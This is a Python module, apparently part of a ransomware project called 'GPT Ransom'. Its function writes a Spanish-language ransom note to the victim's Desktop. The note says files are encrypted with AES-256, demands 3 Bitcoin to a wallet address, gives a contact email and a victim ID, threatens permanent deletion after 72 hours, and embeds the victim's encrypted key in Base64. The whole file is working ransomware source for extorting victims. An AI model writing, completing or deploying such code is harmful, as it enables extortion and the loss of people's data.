import os
from decrypt import load_aes_key_encrypted
import base64
import agent 

def show_note():

  desktop = os.path.join(os.path.expanduser("~"), "Desktop")
  aes_key_encrypted = load_aes_key_encrypted()
  aes_key_encrypted_b64 = base64.b64encode(aes_key_encrypted).decode()
  aes_key_formatted = "\n".join([aes_key_encrypted_b64[i:i+64] for i in range(0, len(aes_key_encrypted_b64), 64)])
  agent_id = agent.get_agent_id()

  # Contenido de la nota de rescate
  note = f"""
  =================================
  ¡TUS ARCHIVOS HAN SIDO CIFRADOS!
  =================================

  Todos tus documentos, imágenes, bases de datos y otros archivos importantes han sido cifrados **AES-CTR** de **256 bits**.
  No puedes acceder a ellos ni recuperarlos sin nuestra ayuda.

  -------------------------------
  ¿CÓMO RECUPERAR TUS ARCHIVOS?
  -------------------------------
  1. Envíanos el pago en Bitcoin (BTC) a la siguiente dirección:
    1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

  2. La cantidad requerida es ***3 Bitcoins (BTC)***.

  3. Envía un correo a recoveryourfiles@gptransom.com con el comprobante de pago y tu ID de víctima:
    ID DE VÍCTIMA: {agent_id}

  4. Una vez confirmado el pago, podrás ejecutar el software de descifrado desde la consola (CMD) 
  accediendo a la ubicación del ejecutable y utilizando el argumento "-decryptor".

  -----------------------------
  ¡ADVERTENCIAS!
  -----------------------------
  - No intentes modificar o recuperar archivos por tu cuenta. 
  - Cualquier intento de descifrado sin nuestra clave puede dañar los archivos de manera irreversible.
  - Si el pago no se realiza en 72 horas, los archivos serán eliminados permanentemente.

  -----------------------------
    INFORMACIÓN SOBRE TU CLAVE 
  -----------------------------
  - Tu clave de descifrado está protegida y cifrada de manera segura.
  - Aquí tienes la versión cifrada de tu clave (en **Base64**, NO INTENTES MODIFICARLA):

  {aes_key_formatted}

  Atentamente, 
  GPT Ransom
  """
  # Ruta donde se guardará la nota de rescate
  note_path = os.path.join(desktop, "README_IMPORTANTE.txt")
  # Guardar la nota en un archivo de texto en el escritorio
  with open(note_path, "w") as archivo:
    archivo.write(note)





